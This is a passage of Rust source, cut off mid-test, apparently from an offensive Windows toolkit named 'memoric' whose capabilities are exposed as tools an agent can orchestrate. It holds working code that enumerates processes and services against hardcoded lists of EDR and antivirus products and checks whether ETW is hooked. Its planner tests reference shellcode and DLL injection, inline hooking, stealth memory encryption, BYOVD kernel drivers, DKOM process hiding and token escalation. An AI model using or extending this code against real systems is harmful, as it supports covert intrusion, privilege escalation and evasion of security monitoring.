            .any(|key| has_param_with_registered_aliases(args, tool, action, key));
        if !has_any {
            missing.push(alternative.parameters.join("|"));
        }
    }

    missing
}

fn static_plan_registry_validation_errors(tool: &str, action: &str, args: &Value) -> Vec<String> {
    let args_with_action = planner_policy_args(action, args);
    let normalized = crate::mcp::tool_args::normalize_common_args(tool, &args_with_action);
    let mut errors = Vec::new();

    if let Err(error) = crate::mcp::tool_args::validate_choice_parameters(tool, &normalized) {
        errors.push(error);
    }
    if let Err(error) = crate::mcp::tool_args::validate_common_input_bounds(tool, &normalized) {
        errors.push(error);
    }
    if let Err(error) = crate::mcp::tool_args::validate_parameter_bounds(tool, &normalized) {
        errors.push(error);
    }
    if let Err(error) = crate::mcp::tool_args::validate_parser_hints(tool, &normalized) {
        errors.push(error);
    }

    errors
}

fn has_param_with_registered_aliases(
    args: &Value,
    tool: &str,
    action: &str,
    canonical: &str,
) -> bool {
    has_param(args, canonical)
        || crate::mcp::action_registry::parameter_aliases(tool, action)
            .iter()
            .any(|alias| alias.canonical == canonical && has_param(args, alias.alias))
}

fn static_plan_warnings(tool: &str, action: &str, args: &Value) -> Vec<String> {
    crate::mcp::action_registry::planner_warnings(tool, action)
        .into_iter()
        .filter(|warning| {
            if warning.unless_matches(args) {
                return false;
            }
            match warning.condition {
                crate::mcp::action_registry::PlannerWarningCondition::Always => true,
                crate::mcp::action_registry::PlannerWarningCondition::ParameterPresent => {
                    warning.parameter.is_some_and(|parameter| {
                        has_param_with_registered_aliases(args, tool, action, parameter)
                    })
                }
                crate::mcp::action_registry::PlannerWarningCondition::ParameterMissing => {
                    warning.parameter.is_some_and(|parameter| {
                        !has_param_with_registered_aliases(args, tool, action, parameter)
                    })
                }
            }
        })
        .map(|warning| warning.message.to_string())
        .collect()
}

fn scan_running_processes() -> Result<Vec<(String, u32)>, MemoricError> {
    use windows::Win32::System::Diagnostics::ToolHelp::*;

    let mut result = Vec::new();

    unsafe {
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
            .map_err(|e| MemoricError::WindowsApi(format!("CreateToolhelp32Snapshot: {}", e)))?;

        let mut entry = PROCESSENTRY32W {
            dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
            ..Default::default()
        };

        if Process32FirstW(snap, &mut entry).is_ok() {
            loop {
                let name_end = entry
                    .szExeFile
                    .iter()
                    .position(|&c| c == 0)
                    .unwrap_or(entry.szExeFile.len());
                let name = String::from_utf16_lossy(&entry.szExeFile[..name_end]);
                result.push((name, entry.th32ProcessID));

                if Process32NextW(snap, &mut entry).is_err() {
                    break;
                }
            }
        }

        let _ = windows::Win32::Foundation::CloseHandle(snap);
    }

    Ok(result)
}

fn scan_security_services() -> Result<Vec<String>, MemoricError> {
    use windows::Win32::System::Services::{
        EnumServicesStatusExW, OpenSCManagerW, ENUM_SERVICE_STATUS_PROCESSW, SC_ENUM_PROCESS_INFO,
        SC_MANAGER_ENUMERATE_SERVICE, SERVICE_STATE_ALL, SERVICE_WIN32,
    };

    let security_service_names = [
        "csagent",
        "csfalconservice", // CrowdStrike
        "sentinelagent",
        "sentinelone", // SentinelOne
        "cbdefense",
        "carbonblack", // Carbon Black
        "cortex",
        "traps", // Palo Alto
        "windefend",
        "mpssvc", // Windows Defender
        "sophosav",
        "sophos", // Sophos
        "mcshield",
        "mcafee", // McAfee
        "sepmaster",
        "symantec", // Symantec
        "klnagent",
        "kaspersky", // Kaspersky
        "sysmon",
        "sysmon64", // Sysmon
    ];

    let mut services = Vec::new();

    unsafe {
        let scm = OpenSCManagerW(None, None, SC_MANAGER_ENUMERATE_SERVICE)
            .map_err(|e| MemoricError::WindowsApi(format!("OpenSCManager: {}", e)))?;

        let mut bytes_needed = 0u32;
        let mut services_returned = 0u32;
        let mut resume_handle = 0u32;

        let _ = EnumServicesStatusExW(
            scm,
            SC_ENUM_PROCESS_INFO,
            SERVICE_WIN32,
            SERVICE_STATE_ALL,
            None,
            &mut bytes_needed,
            &mut services_returned,
            Some(&mut resume_handle),
            None,
        );

        if bytes_needed > 0 {
            let mut buf = vec![0u8; bytes_needed as usize];
            if EnumServicesStatusExW(
                scm,
                SC_ENUM_PROCESS_INFO,
                SERVICE_WIN32,
                SERVICE_STATE_ALL,
                Some(&mut buf),
                &mut bytes_needed,
                &mut services_returned,
                Some(&mut resume_handle),
                None,
            )
            .is_ok()
            {
                let svc_array = std::slice::from_raw_parts(
                    buf.as_ptr() as *const ENUM_SERVICE_STATUS_PROCESSW,
                    services_returned as usize,
                );

                for svc in svc_array {
                    let svc_name = svc.lpServiceName.to_string().unwrap_or_default();
                    let lower = svc_name.to_lowercase();
                    for known in &security_service_names {
                        if lower.contains(known) {
                            let running = svc.ServiceStatusProcess.dwCurrentState.0 == 4; // SERVICE_RUNNING
                            services.push(format!(
                                "{} ({})",
                                svc_name,
                                if running { "RUNNING" } else { "stopped" }
                            ));
                            break;
                        }
                    }
                }
            }
        }

        let _ = windows::Win32::System::Services::CloseServiceHandle(scm);
    }

    Ok(services)
}

fn is_security_product(name: &str) -> bool {
    let lower = name.to_lowercase();
    let security_processes = [
        "msmpeng.exe",
        "mpcmdrun.exe",
        "nissrv.exe", // Defender
        "csfalconservice.exe",
        "csagent.exe", // CrowdStrike
        "sentinelagent.exe",
        "sentinelone.exe", // SentinelOne
        "cbdefense.exe",
        "repux.exe", // Carbon Black
        "cortex.exe",
        "trapsd.exe", // Palo Alto
        "sophosav.exe",
        "savservice.exe", // Sophos
        "mcshield.exe",
        "mfeavsvc.exe", // McAfee
        "ccsvchst.exe",
        "rtvscan.exe", // Symantec
        "avp.exe",
        "kavtray.exe", // Kaspersky
        "sysmon.exe",
        "sysmon64.exe", // Sysmon
        "bdagent.exe",
        "vsserv.exe", // Bitdefender
        "avgui.exe",
        "avgsvc.exe", // AVG
        "avastui.exe",
        "avastsvc.exe", // Avast
        "elastic-agent.exe",
        "elastic-endpoint.exe", // Elastic
        "firetray.exe",         // Trellix
    ];

    security_processes.iter().any(|p| lower == *p)
}

fn check_sysmon_present() -> bool {
    use windows::core::{w, PCWSTR};
    use windows::Win32::System::Services::{
        OpenSCManagerW, OpenServiceW, QueryServiceStatus, SC_MANAGER_CONNECT, SERVICE_QUERY_STATUS,
        SERVICE_STATUS,
    };

    unsafe {
        let scm = match OpenSCManagerW(None, None, SC_MANAGER_CONNECT) {
            Ok(h) => h,
            Err(_) => return false,
        };

        for svc_name in [w!("sysmon64"), w!("sysmon")] {
            let svc = match OpenServiceW(scm, PCWSTR(svc_name.as_ptr()), SERVICE_QUERY_STATUS) {
                Ok(h) => h,
                Err(_) => continue,
            };

            let mut status = SERVICE_STATUS::default();
            let running =
                QueryServiceStatus(svc, &mut status).is_ok() && status.dwCurrentState.0 == 4; // SERVICE_RUNNING

            let _ = windows::Win32::System::Services::CloseServiceHandle(svc);

            if running {
                let _ = windows::Win32::System::Services::CloseServiceHandle(scm);
                return true;
            }
        }

        let _ = windows::Win32::System::Services::CloseServiceHandle(scm);
    }
    false
}

fn check_etw_ti_enabled() -> bool {
    // Check if EtwThreatIntProvRegHandle is non-null
    // This is a heuristic — if ntdll!EtwEventWrite is hooked, ETW-TI is likely active
    unsafe {
        use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
        let ntdll = match GetModuleHandleA(windows::core::PCSTR(b"ntdll.dll\0".as_ptr())) {
            Ok(h) => h,
            Err(_) => return false,
        };

        let func = GetProcAddress(ntdll, windows::core::PCSTR(b"EtwEventWrite\0".as_ptr()));
        if let Some(ptr) = func {
            let bytes = std::slice::from_raw_parts(ptr as *const u8, 4);
            // If first bytes are a JMP (0xFF 0x25 or 0xE9), it's hooked → ETW monitoring active
            bytes[0] == 0xFF || bytes[0] == 0xE9
        } else {
            false
        }
    }
}

fn is_valid_tool(tool: &str) -> bool {
    matches!(
        tool,
        "memoric"
            | "target"
            | "memory"
            | "inject"
            | "payload"
            | "hook"
            | "stealth"
            | "detect"
            | "privilege"
            | "kernel"
            | "self"
            | "orchestrate"
    )
}

#[cfg(test)]
mod tests {
    use super::{
        apply_live_planner_selection, assess_environment, cancel_chain, chain_status,
        cleanup_chain, create_chain_state, dependency_aware_rollback_plan, execute_chain,
        execute_dependency_aware_rollback, load_chain_state_file_from_path,
        mark_chain_step_completed, mark_chain_step_running, orchestration_dag_preview,
        orchestration_step_id, persist_chain_state_to_path, plan_chain, planner_decision,
        resume_chain, CHAIN_STATE_PATH_ENV,
    };
    use serde_json::{json, Value};

    struct EnvRestore {
        key: &'static str,
        previous: Option<String>,
    }

    impl EnvRestore {
        fn remove(key: &'static str) -> Self {
            let previous = std::env::var(key).ok();
            std::env::remove_var(key);
            Self { key, previous }
        }
    }

    impl Drop for EnvRestore {
        fn drop(&mut self) {
            if let Some(value) = &self.previous {
                std::env::set_var(self.key, value);
            } else {
                std::env::remove_var(self.key);
            }
        }
    }

    fn set_env(key: &'static str, value: &str) -> EnvRestore {
        let previous = std::env::var(key).ok();
        std::env::set_var(key, value);
        EnvRestore { key, previous }
    }

    fn isolate_policy_env() -> Vec<EnvRestore> {
        vec![
            EnvRestore::remove("MEMORIC_POLICY"),
            EnvRestore::remove("MEMORIC_POLICY_PROFILE_PATH"),
            EnvRestore::remove("MEMORIC_POLICY_PROFILE_ALLOW_LOCAL_OVERRIDE"),
            EnvRestore::remove("MEMORIC_POLICY_PROFILE_SIGNATURE_KEY"),
        ]
    }

    fn pagination_plan_steps() -> Value {
        json!([
            {"tool":"self","action":"info","args":{}},
            {"tool":"self","action":"version","args":{}},
            {"tool":"privilege","action":"check","args":{}}
        ])
    }

    #[test]
    fn plan_chain_without_steps_returns_validation_error() {
        let result = plan_chain(&json!({})).expect("plan should not fail hard");
        assert_eq!(result["success"], false);
        assert_eq!(result["mode"], "static_validation_only");
        assert_eq!(result["executes_live_actions"], false);
        assert!(result["validation_errors"]
            .as_array()
            .is_some_and(|errors| !errors.is_empty()));
    }

    #[test]
    fn plan_chain_reports_missing_common_params() {
        let result = plan_chain(&json!({
            "steps": [
                { "tool": "target", "action": "module_base", "args": { "pid": 1234, "name": "kernel32.dll" } },
                { "tool": "stealth", "action": "encrypt_memory", "args": { "pid": 1234, "address": "0x1000", "size": 16 } },
                { "tool": "payload", "action": "pe_parse", "args": { "pid": 1234, "show": "imports" } },
                { "tool": "kernel", "action": "read", "args": { "address": "0x1000" } }
            ]
        }))
        .expect("plan should validate statically");

        let errors = result["validation_errors"].as_array().unwrap();
        assert!(errors
            .iter()
            .any(|e| e.as_str().unwrap_or_default().contains("module_name")));

        let warnings = result["validation_warnings"].as_array().unwrap();
        assert!(warnings.iter().any(|w| w
            .as_str()
            .unwrap_or_default()
            .contains("local memoric process memory")));
        assert!(warnings.iter().any(|w| w
            .as_str()
            .unwrap_or_default()
            .contains("pe_parse reads a PE image at a base address")));
        assert!(warnings.iter().any(|w| w
            .as_str()
            .unwrap_or_default()
            .contains("kernel generic helpers require an explicit BYOVD device_path")));

        let alias_result = plan_chain(&json!({
            "steps": [
                { "tool": "payload", "action": "pe_parse", "args": { "pid": 1234, "show": "imports", "base_address": "0x400000" } }
            ]
        }))
        .expect("alias-backed pe_parse should not produce a missing-address warning");
        let alias_warnings = alias_result["validation_warnings"].as_array().unwrap();
        assert!(
            !alias_warnings.iter().any(|warning| warning
                .as_str()
                .unwrap_or_default()
                .contains("pe_parse reads a PE image at a base address")),
            "base_address alias should satisfy the registry planner warning condition"
        );
    }

    #[test]
    fn plan_chain_uses_registry_required_parameters() {
        let result = plan_chain(&json!({
            "steps": [
                { "tool": "memory", "action": "read", "args": { "address": "0x1000" } },
                { "tool": "inject", "action": "dll", "args": { "pid": 1234 } },
                { "tool": "inject", "action": "shellcode", "args": { "pid": 1234, "method": "thread" } },
                { "tool": "inject", "action": "spawn", "args": { "target_path": "C:\\Windows\\System32\\notepad.exe" } },
                { "tool": "inject", "action": "spawn", "args": { "target_exe": "C:\\Windows\\System32\\notepad.exe", "spawn_method": "early_bird" } },
                { "tool": "inject", "action": "spawn", "args": { "spawn_method": "ghost" } },
                { "tool": "hook", "action": "install", "args": { "pid": 1234 } },
                { "tool": "hook", "action": "hook_function", "args": { "pid": 1234, "method": "inline" } },
                { "tool": "memory", "action": "write", "args": { "pid": 1234, "address": "0x1000" } },
                { "tool": "payload", "action": "pe_parse", "args": { "pid": 1234, "show": "imports" } },
                { "tool": "payload", "action": "pe_parse", "args": { "pid": 1234, "show": "iat_entry" } }
            ]
        }))
        .expect("plan should validate required parameters through registry");

        let errors = result["validation_errors"].as_array().unwrap();
        assert!(errors.iter().any(|error| {
            let error = error.as_str().unwrap_or_default();
            error.contains("memory/read") && error.contains("pid") && error.contains("size")
        }));
        assert!(errors.iter().any(|error| {
            let error = error.as_str().unwrap_or_default();
            error.contains("inject/dll") && error.contains("dll_path")
        }));
        assert!(errors.iter().any(|error| {
            let error = error.as_str().unwrap_or_default();
            error.contains("inject/shellcode") && error.contains("shellcode")
        }));
        assert!(errors.iter().any(|error| {
            let error = error.as_str().unwrap_or_default();
            error.contains("inject/spawn") && error.contains("payload")
        }));
        assert!(errors.iter().any(|error| {
            let error = error.as_str().unwrap_or_default();
            error.contains("inject/spawn") && error.contains("shellcode")
        }));
        assert!(errors.iter().any(|error| {
            let error = error.as_str().unwrap_or_default();
            error.contains("inject/spawn") && error.contains("target_path")
        }));
        assert!(errors.iter().any(|error| {
            let error = error.as_str().unwrap_or_default();
            error.contains("hook/install") && error.contains("module")
        }));
        assert!(errors.iter().any(|error| {
            let error = error.as_str().unwrap_or_default();
            error.contains("hook/hook_function") && error.contains("target_address")
        }));
        assert!(errors.iter().any(|error| {
            let error = error.as_str().unwrap_or_default();
            error.contains("memory/write") && error.contains("bytes|text")
        }));
        assert!(errors.iter().any(|error| {
            let error = error.as_str().unwrap_or_default();
            error.contains("payload/pe_parse") && error.contains("address")
        }));
        assert!(errors.iter().any(|error| {
            let error = error.as_str().unwrap_or_default();
            error.contains("payload/pe_parse") && error.contains("module")
        }));

        let valid_alias_result = plan_chain(&json!({
            "steps": [
                { "tool": "memory", "action": "write", "args": { "pid": 1234, "base_address": "0x1000", "text": "ok", "dry_run": true } },
                { "tool": "payload", "action": "pe_parse", "args": { "pid": 1234, "show": "imports", "base_address": "0x400000" } },
                { "tool": "payload", "action": "pe_parse", "args": { "pid": 1234, "show": "iat_entry", "module_name": "kernel32.dll" } }
            ]
        }))
        .expect("registry aliases and alternatives should satisfy static plan validation");
        let alias_errors = valid_alias_result["validation_errors"].as_array().unwrap();
        assert!(
            alias_errors.is_empty(),
            "alias-backed registry requirements should not produce validation errors: {:?}",
            alias_errors
        );
    }

    #[test]
    fn plan_chain_reuses_registry_preflight_validation() {
        let result = plan_chain(&json!({
            "steps": [
                { "tool": "memory", "action": "read", "args": { "pid": 1234, "address": "0x1000", "size": 67108865, "mode": "bad" } },
                { "tool": "memory", "action": "protect", "args": { "pid": 1234, "address": "not-an-address", "protect": "PAGE_EXECUTE_READ" } },
                { "tool": "orchestrate", "action": "plan", "args": { "steps": [ { "tool": "self" } ] } }
            ]
        }))
        .expect("plan should report preflight errors as validation output");

        let errors = result["validation_errors"].as_array().unwrap();
        assert!(errors.iter().any(|error| {
            let error = error.as_str().unwrap_or_default();
            error.contains("memory(action='read')")
                && error.contains("mode")
                && error.contains("Allowed")
        }));
        assert!(errors.iter().any(|error| {
            let error = error.as_str().unwrap_or_default();
            error.contains("memory(action='read')")
                && error.contains("size")
                && error.contains("<= 67108864")
        }));
        assert!(errors.iter().any(|error| {
            let error = error.as_str().unwrap_or_default();
            error.contains("memory(action='protect')")
                && error.contains("address")
                && error.contains("parser hints")
        }));
        assert!(errors.iter().any(|error| {
            let error = error.as_str().unwrap_or_default();
            error.contains("orchestrate(action='plan')")
                && error.contains("steps")
                && error.contains("required field 'action'")
        }));
    }

    #[test]
    fn plan_chain_lab_validation_template_defaults_to_self_only() {
        let result = plan_chain(&json!({
            "template": "lab_validation"
        }))
        .expect("template plan should validate statically");

        assert_eq!(result["success"], true);
        assert_eq!(result["template"], "lab_validation");
        assert_eq!(result["executes_live_actions"], false);
        assert!(result["policy_planner"].is_object());
        assert!(result["plan"]
            .as_array()
            .unwrap()
            .iter()
            .all(|step| step["tool"] == "self"));
    }

    #[test]
    fn plan_chain_lab_validation_target_uses_dry_run_write_preview() {
        let result = plan_chain(&json!({
            "template": "lab_validation",
            "benign_pid": 1234,
            "marker_address": "0x1000",
            "counter_address": "0x2000"
        }))
        .expect("template plan should validate statically");

        assert_eq!(result["success"], true);
        assert!(result["validation_errors"].as_array().unwrap().is_empty());
        let plan = result["plan"].as_array().unwrap();
        assert!(plan
            .iter()
            .any(|step| step["tool"] == "memory" && step["action"] == "diagnostics"));
        assert!(plan
            .iter()
            .any(|step| step["tool"] == "memory" && step["action"] == "read"));

        let write = plan
            .iter()
            .find(|step| step["tool"] == "memory" && step["action"] == "write")
            .expect("write preview");
        assert_eq!(write["args"]["dry_run"], true);
        assert_eq!(write["planner"]["status"], "included");
        assert_eq!(write["planner"]["include_in_effective_plan"], true);

        let effective_plan = result["effective_plan"].as_array().unwrap();
        assert!(effective_plan
            .iter()
            .any(|step| step["tool"] == "memory" && step["action"] == "write"));
    }

    #[test]
    fn plan_chain_unknown_template_reports_validation_error() {
        let result = plan_chain(&json!({
            "template": "not_real"
        }))
        .expect("unknown template should be reported as validation output");

        assert_eq!(result["success"], false);
        assert!(result["validation_errors"]
            .as_array()
            .unwrap()
            .iter()
            .any(|error| error
                .as_str()
                .unwrap_or_default()
                .contains("Unknown orchestration template")));
    }

    #[test]
    fn plan_chain_read_only_template_is_effective_under_restricted_policy() {
        let result = plan_chain(&json!({
            "template": "reconnaissance"
        }))
        .expect("read-only template should validate statically");

        assert_eq!(result["success"], true);
        assert_eq!(result["executes_live_actions"], false);
        assert_eq!(result["blocked_steps"].as_array().unwrap().len(), 0);
        assert_eq!(result["effective_steps"], result["steps"]);
        assert!(result["effective_plan"]
            .as_array()
            .unwrap()
            .iter()
            .all(|step| step["planner"]["read_only"] == true));
    }

    #[test]
    fn plan_chain_outputs_dag_nodes_edges_and_execution_order() {
        let _guard = crate::state::TEST_ENV_LOCK.lock().unwrap();
        let _env = isolate_policy_env();
        let result = plan_chain(&json!({
            "steps": [
                {"id":"discover", "tool":"target", "action":"ps_list", "args":{"limit": 10}},
                {"id":"doctor", "tool":"self", "action":"doctor", "args":{}, "depends_on":["discover"]},
                {"id":"priv", "tool":"privilege", "action":"check", "args":{}, "depends_on":["discover"]},
                {"id":"status", "tool":"self", "action":"status", "args":{}, "depends_on":["doctor","priv"]}
            ]
        }))
        .expect("dag plan should validate");

        assert_eq!(result["success"], true);
        assert_eq!(result["dag"]["schema"], "memoric.orchestration.dag.v1");
        assert_eq!(result["dag"]["mode"], "explicit");
        assert_eq!(result["dag"]["edges"].as_array().unwrap().len(), 4);
        assert_eq!(
            result["dag"]["execution_order"]
                .as_array()
                .unwrap()
                .iter()
                .filter_map(|value| value.as_str())
                .collect::<Vec<_>>(),
            vec!["discover", "doctor", "priv", "status"]
        );
        assert_eq!(result["plan"][1]["depends_on"][0], "discover");
        assert_eq!(result["plan"][1]["dependency_mode"], "explicit");
        assert!(result["plan"][1]["preconditions"].is_array());
        assert!(result["plan"][1]["rollback"].is_object());
    }

    #[test]
    fn plan_chain_skips_explicit_dependents_when_dependency_blocked() {
        let _guard = crate::state::TEST_ENV_LOCK.lock().unwrap();
        let _env = isolate_policy_env();
        let result = plan_chain(&json!({
            "steps": [
                {"id":"mutate", "tool":"memory", "action":"write", "args":{"pid": 1234, "address": "0x1000", "bytes": [1]}},
                {"id":"verify", "tool":"memory", "action":"read", "args":{"pid": 1234, "address": "0x1000", "size": 1}, "depends_on":["mutate"]}
            ]
        }))
        .expect("blocked dependency should be represented in plan output");

        assert_eq!(result["success"], true);
        assert_eq!(result["plan"][0]["planner"]["status"], "blocked");
        assert_eq!(result["plan"][1]["planner"]["status"], "blocked");
        assert!(result["plan"][1]["planner"]["skip_reason"]
            .as_str()
            .unwrap()
            .contains("dependency 'mutate'"));
        assert_eq!(result["effective_steps"], 0);
    }

    #[test]
    fn plan_chain_reports_missing_dependency_and_cycle() {
        let missing = plan_chain(&json!({
            "steps": [
                {"id":"read", "tool":"self", "action":"status", "args":{}, "depends_on":["not-present"]}
            ]
        }))
        .expect("missing dependency is validation output");
        assert_eq!(missing["success"], false);
        assert_eq!(
            missing["dag"]["missing_dependencies"]
                .as_array()
                .unwrap()
                .len(),
            1
        );

        let cycle = plan_chain(&json!({
            "steps": [
                {"id":"a", "tool":"self", "action":"status", "args":{}, "depends_on":["b"]},
                {"id":"b", "tool":"self", "action":"version", "args":{}, "depends_on":["a"]}
            ]
        }))
        .expect("cycle is validation output");
        assert_eq!(cycle["success"], false);
        assert_eq!(cycle["dag"]["cycle_detected"], true);
        assert!(cycle["validation_errors"]
            .as_array()
            .unwrap()
            .iter()
            .any(|error| error.as_str().unwrap_or("").contains("cycle")));
    }

    #[test]
    fn rollback_plan_uses_reverse_dependency_order_and_marks_executable_steps() {
        let dag = json!({
            "execution_order": ["alloc", "protect", "write"]
        });
        let executed = vec![
            json!({
                "id": "alloc",
                "tool": "memory",
                "action": "alloc",
                "rollback": {
                    "available": true,
                    "strategy": "free_allocated_region",
                    "args": {"pid": 1234, "address": "0x2000", "size": 4096}
                }
            }),
            json!({
                "id": "protect",
                "tool": "memory",
                "action": "protect",
                "rollback": {
                    "available": "partial",
                    "strategy": "restore_previous_protection"
                }
            }),
            json!({
                "id": "write",
                "tool": "memory",
                "action": "write",
                "rollback": {
                    "action": {
                        "tool": "memory",
                        "action": "write",
                        "args": {"pid": 1234, "address": "0x2000", "bytes": [0]}
                    }
                }
            }),
        ];

        let rollback = dependency_aware_rollback_plan(&executed, &dag);

        assert_eq!(
            rollback["order"]
                .as_array()
                .unwrap()
                .iter()
                .filter_map(|value| value.as_str())
                .collect::<Vec<_>>(),
            vec!["write", "protect", "alloc"]
        );
        assert_eq!(rollback["steps"][0]["executable"], true);
        assert_eq!(rollback["steps"][0]["rollback_action"]["action"], "write");
        assert_eq!(rollback["steps"][1]["executable"], false);
        assert_eq!(rollback["steps"][2]["executable"], true);
        assert_eq!(rollback["steps"][2]["rollback_action"]["action"], "free");
    }

    #[test]
    fn rollback_execution_honors_task_cancellation_before_live_rollback_steps() {
        let task_id =
            crate::mcp::tasks::create("orchestrate", "rollback", "rollback pending").expect("task");
        crate::mcp::tasks::cancel(&task_id).expect("cancel");
        let dag = json!({
            "execution_order": ["write"]
        });
        let executed = vec![json!({
            "id": "write",
            "tool": "memory",
            "action": "write",
            "rollback": {
                "action": {
                    "tool": "memory",
                    "action": "write",
                    "args": {"pid": 1234, "address": "0x2000", "bytes": [0]}
                }
            }
        })];

        let rollback = execute_dependency_aware_rollback(
            &executed,
            &dag,
            "chain-test",
            &json!({ "task_id": task_id }),
        );

        assert_eq!(rollback["triggered"], true);
        assert_eq!(rollback["steps"][0]["status"], "cancelled");
        assert!(rollback["steps"][0]["reason"]
            .as_str()
            .unwrap()
            .contains("cancelled"));
    }

    #[test]
    fn plan_chain_paginates_result_sections_with_stable_cursor() {
        let _guard = crate::state::TEST_ENV_LOCK.lock().unwrap();
        let _env = isolate_policy_env();
        let args = json!({
            "steps": pagination_plan_steps(),
            "limit": 1
        });
        let first = plan_chain(&args).expect("first plan page");

        assert_eq!(first["plan"].as_array().unwrap().len(), 1);
        assert_eq!(first["plan"][0]["order"], 1);
        assert_eq!(first["pagination"]["sections"]["planPage"]["total"], 3);
        let cursor = first["pagination"]["nextCursor"]
            .as_str()
            .expect("next cursor")
            .to_string();

        let second = plan_chain(&json!({
            "steps": pagination_plan_steps(),
            "limit": 1,
            "cursor": cursor
        }))
        .expect("second plan page");
        assert_eq!(second["plan"].as_array().unwrap().len(), 1);
        assert_eq!(second["plan"][0]["order"], 2);
        assert_eq!(second["pagination"]["offset"], 1);
    }

    #[test]
    fn plan_chain_exports_full_plan_artifact_when_output_path_is_requested() {
        let _guard = crate::state::TEST_ENV_LOCK.lock().unwrap();
        let _env = isolate_policy_env();
        let output_path = std::env::temp_dir().join(format!(
            "memoric-orchestration-plan-artifact-{}.json",
            std::process::id()
        ));
        let _ = std::fs::remove_file(&output_path);

        let result = plan_chain(&json!({
            "steps": pagination_plan_steps(),
            "limit": 1,
            "output_path": output_path.display().to_string(),
            "artifact_retention_secs": 60,
            "request_id": "orchestration-plan-artifact-test"
        }))
        .expect("plan artifact export");

        assert_eq!(result["success"], true);
        assert_eq!(result["redaction_status"], "artifact");
        assert_eq!(result["export_reason"], "explicit_output_path");
        assert_eq!(result["exported_count"], 3);
        assert_eq!(result["plan"].as_array().unwrap().len(), 1);
        assert_eq!(result["artifact"]["size_bytes"].as_u64().unwrap() > 0, true);
        let uri = result["artifact"]["uri"].as_str().expect("artifact uri");
        assert!(crate::artifact::is_artifact_uri(uri));

        let exported: serde_json::Value =
            serde_json::from_slice(&std::fs::read(&output_path).expect("plan artifact file"))
                .expect("plan artifact json");
        assert_eq!(exported["kind"], "orchestration-plan");
        assert_eq!(exported["steps"], 3);
        assert_eq!(exported["plan"].as_array().unwrap().len(), 3);
        assert_eq!(exported["redaction_status"], "artifact");

        let _ = crate::artifact::forget(uri);
        let _ = std::fs::remove_file(output_path);
    }

    #[test]
    fn plan_chain_rejects_cursor_when_result_snapshot_changes() {
        let _guard = crate::state::TEST_ENV_LOCK.lock().unwrap();
        let _env = isolate_policy_env();
        let first = plan_chain(&json!({
            "steps": pagination_plan_steps(),
            "limit": 1
        }))
        .expect("first plan page");
        let cursor = first["pagination"]["nextCursor"]
            .as_str()
            .expect("next cursor")
            .to_string();

        let err = plan_chain(&json!({
            "steps": [
                {"tool":"self","action":"info","args":{}},
                {"tool":"self","action":"status","args":{}},
                {"tool":"privilege","action":"check","args":{}}
            ],
            "cursor": cursor
        }))
        .expect_err("changed snapshot should reject cursor");
        assert!(err.to_string().contains("snapshot changed"));
    }

    #[test]
    fn plan_chain_rejects_zero_result_page_limit() {
        let err = plan_chain(&json!({
            "steps": pagination_plan_steps(),
            "limit": 0
        }))
        .expect_err("zero limit should fail");
        assert!(err.to_string().contains("greater than 0"));
    }

    #[test]
    fn planner_blocks_kernel_steps_when_driver_capabilities_are_missing() {
        let capabilities = json!({
            "platform": { "supported": true, "message": "Windows runtime detected" },
            "privilege": {
                "elevated": true,
                "debug": { "enabled": true }
            },
            "driver": {
                "readiness": {
                    "kernel_actions_ready": false,
                    "driver_load_possible": false
                },
                "message": "driver unavailable in test matrix"
            }
        });

        let decision = planner_decision(
            "kernel",
            "write",
            &json!({ "device_path": "\\\\.\\Memoric", "address": "0x1000", "bytes": [1] }),
            &capabilities,
        );

        assert_eq!(decision["status"], "blocked");
        assert_eq!(decision["include_in_effective_plan"], false);
        assert!(decision["capabilities"]["blockers"]
            .as_array()
            .unwrap()
            .iter()
            .any(|blocker| blocker["code"] == "driver_unavailable"));
        assert!(decision["alternatives"]
            .as_array()
            .unwrap()
            .iter()
            .any(|alternative| alternative["tool"] == "self" && alternative["action"] == "doctor"));
    }

    #[test]
    fn planner_selects_kernel_driver_fallback_from_capabilities() {
        let capabilities = json!({
            "platform": { "supported": true, "message": "Windows runtime detected" },
            "privilege": {
                "elevated": true,
                "debug": { "enabled": true }
            },
            "driver": {
                "readiness": {
                    "kernel_actions_ready": false,
                    "driver_load_possible": true
                },
                "message": "driver payload is ready for load"
            }
        });

        let decision = planner_decision(
            "kernel",
            "token_escalate",
            &json!({ "pid": 1234 }),
            &capabilities,
        );

        assert_eq!(decision["selection"]["kind"], "kernel_driver_source");
        assert_eq!(
            decision["selection"]["selected"]["method"],
            "memoric_driver_auto_load"
        );
        assert_eq!(
            decision["selection"]["evidence"]["driver_load_possible"],
            true
        );
        assert!(decision["selection"]["candidates"]
            .as_array()
            .unwrap()
            .iter()
            .any(|candidate| candidate["method"] == "byovd_explicit"
                && candidate["blockers"]
                    .as_array()
                    .unwrap()
                    .contains(&json!("requires_explicit_device_path"))));
    }

    #[test]
    fn planner_honors_explicit_byovd_over_memoric_kernel_fallback() {
        let capabilities = json!({
            "platform": { "supported": true, "message": "Windows runtime detected" },
            "privilege": {
                "elevated": true,
                "debug": { "enabled": true }
            },
            "driver": {
                "readiness": {
                    "kernel_actions_ready": true,
                    "driver_load_possible": true
                },
                "message": "memoric.sys device is reachable"
            }
        });

        let decision = planner_decision(
            "kernel",
            "dkom_hide",
            &json!({ "pid": 1234, "device_path": "\\\\.\\RTCore64" }),
            &capabilities,
        );

        assert_eq!(decision["selection"]["status"], "selected");
        assert_eq!(decision["selection"]["parameter"], "device_path");
        assert_eq!(decision["selection"]["requested"], "byovd_explicit");
        assert_eq!(
            decision["selection"]["selected"]["method"],
            "byovd_explicit"
        );
    }

    #[test]
    fn planner_recommends_injection_method_fallback_when_requested_method_needs_driver() {
        let capabilities = json!({
            "platform": { "supported": true, "message": "Windows runtime detected" },
            "privilege": {
                "elevated": true,
                "debug": { "enabled": true }
            },
            "driver": {
                "readiness": {
                    "kernel_actions_ready": false,
                    "driver_load_possible": false
                },
                "message": "driver unavailable in test matrix"
            }
        });

        let decision = planner_decision(
            "inject",
            "shellcode",
            &json!({ "pid": 1234, "method": "kernel_driver_apc" }),
            &capabilities,
        );

        assert_eq!(decision["selection"]["kind"], "injection_method");
        assert_eq!(decision["selection"]["status"], "fallback_recommended");
        assert_eq!(decision["selection"]["selected"]["method"], "thread");
        assert!(decision["selection"]["candidates"]
            .as_array()
            .unwrap()
            .iter()
            .any(|candidate| candidate["method"] == "kernel_driver_apc"
                && candidate["available"] == false
                && candidate["blockers"]
                    .as_array()
                    .unwrap()
